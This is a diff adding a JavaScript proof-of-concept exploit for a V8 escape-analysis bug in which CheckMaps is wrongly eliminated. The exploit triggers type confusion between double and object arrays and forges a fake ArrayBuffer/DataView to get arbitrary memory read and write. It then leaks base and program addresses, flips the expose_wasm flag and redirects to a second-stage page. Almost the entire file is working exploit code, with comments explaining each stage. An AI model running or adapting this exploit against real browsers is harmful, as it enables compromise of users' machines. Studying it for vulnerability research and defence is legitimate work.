@@ -1,0 +1,141 @@
+//<script type="text/javascript">
+
+function dp(x){} //{ %DebugPrint(x);}
+
+const assert = function (b, msg)
+{
+	if (!b)
+		throw Error(msg);
+};
+const __buf8 = new ArrayBuffer(8);
+const __dvCvt = new DataView(__buf8);
+function d2u(val)
+{ //double ==> Uint64
+	__dvCvt.setFloat64(0, val, true);
+	return __dvCvt.getUint32(0, true) +
+		__dvCvt.getUint32(4, true) * 0x100000000;
+}
+function u2d(val)
+{ //Uint64 ==> double
+	const tmp0 = val % 0x100000000;
+	__dvCvt.setUint32(0, tmp0, true);
+	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
+	return __dvCvt.getFloat64(0, true);
+}
+const hex = (x) => ("0x" + x.toString(16));
+
+/*
+The problem is the code here does not check `!vobject->HasEscaped()`:
+
+```c++
+} else if (vobject) {
+  Node* cache_map = vobject->Map();
+  if (cache_map) {
+    Type const map_type = NodeProperties::GetType(cache_map);
+    if (map_type.IsHeapConstant() &&
+        params.maps().contains(
+            map_type.AsHeapConstant()->Ref().AsMap().object())) {
+      current->MarkForDeletion();
+      break;
+    }
+  }
+```
+
+Therefore, `CheckMaps` of escaped object may be wrongly eliminated.
+What we need is:
+1. An allocation inside the function,
+	so that there will be StoreField node to store Map.
+	(e.i. we cannot pass object for type confusion as function parameter)
+2. We cannot pass the value of this object to input of unknown nodes
+	otherwise Map inside VirtualObject will be set to `nullptr`
+	(e.i. we cannot use node like TransitionElementKind)
+3. We must have `CheckMap` before place that triggers type confusion
+	just before EscapeAnalysis phase,
+	which can be done by escaping the object used for confusion.
+	(otherwise CheckMap can be eliminated in previous phase,
+	so bug will not be triggered)
+	This can be achieved by passing the object to callback function.
+*/
+function f(b, callback)
+{
+	const arr = new Array(1.1, 2.2);
+	// object for type confusion,
+	// initially it is a DoubleArray,
+	// we are going to change it to ObjectArray
+
+	const o = {a:arr};
+	callback(o);
+	// escape the `arr`,
+	// we are going to change `arr` to ObjectArray here
+
+	if (b === 1)
+		// CheckMap for this will be eliminated
+		// so this unboxed double value will be
+		// written to an ObjectArray
+		o.a[0] = 6.8000273095294023367154124246E-316;
+		// 0x08342125
+	return o.a;
+}
+
+for (let i = 0; i < 0x1000; i++) {
+	f(0, ()=>1);
+	f(1, ()=>2);
+}
+const faker = new Array(0x10000);
+faker.fill(13.37);
+dp(faker);
+// bk store 0x08342115
+
+// db array Map 0x08283155
+// obj array Map 0x082831a5
+// ArrayBuffer Map 0x08282dbd
+const arr = f(1, (o)=>{o.a[0] = {};});
+// change arr to object array
+
+// fake double array to leak base address
+// 0x08283155 0x00000000 0x08340000 0x00000002
+faker[1] = u2d(0x08283155);
+faker[2] = u2d(0x208340009);
+
+let fakeObj = arr[0];
+
+const baseAddr = d2u(fakeObj[0]) - 0x98f0;
+dp(hex(baseAddr));
+assert(baseAddr % 0x100000000 === 0, "baseAddr wrong");
+
+faker[1] = u2d(0x08282dbd);
+faker[2] = u2d(0x133700000000);
+faker[3] = 0; faker[4] = 0;
+faker[5] = u2d(0x200000000);
+
+dp(fakeObj);
+let dataView = new DataView(fakeObj);
+
+function memRead(addr)
+{
+	const t = addr % 0x100000000;
+	faker[3] = u2d(t * 0x100000000);
+	faker[4] = u2d((addr - t) / 0x100000000);
+	return d2u(dataView.getFloat64(0, true));
+}
+
+const progAddr = memRead(memRead(baseAddr + 0x8340040)) - 0xa780108;
+const exposeWasmAddr = memRead(progAddr + 0xacb01c0);
+
+let t = exposeWasmAddr % 0x100000000;
+faker[3] = u2d(t * 0x100000000);
+faker[4] = u2d((exposeWasmAddr - t) / 0x100000000);
+
+dataView.setUint8(0, 1, true);
+// expose_wasm = true
+
+arr[0] = 0;
+arr[1] = 0;
+fakeObj = 0;
+dataView = 0;
+location.href = "/2dc1bc72e2b14.html";
+// go to exploitation with wasm
+
+
+// alert(1);
+//</script>
